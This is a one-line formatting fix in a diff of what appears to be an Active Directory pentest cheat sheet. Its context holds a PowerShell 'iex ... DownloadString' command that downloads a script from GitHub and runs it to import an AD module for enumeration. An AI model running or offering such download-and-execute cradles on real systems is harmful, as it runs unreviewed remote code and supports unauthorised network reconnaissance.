@@ -2338,7 +2338,7 @@ https://github.com/BloodHoundAD/AzureHound
 
 ### Using AD Module
 
-- **Importing AD Module
+- **Importing AD Module **
 ```
 PS C:\> iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
 ```
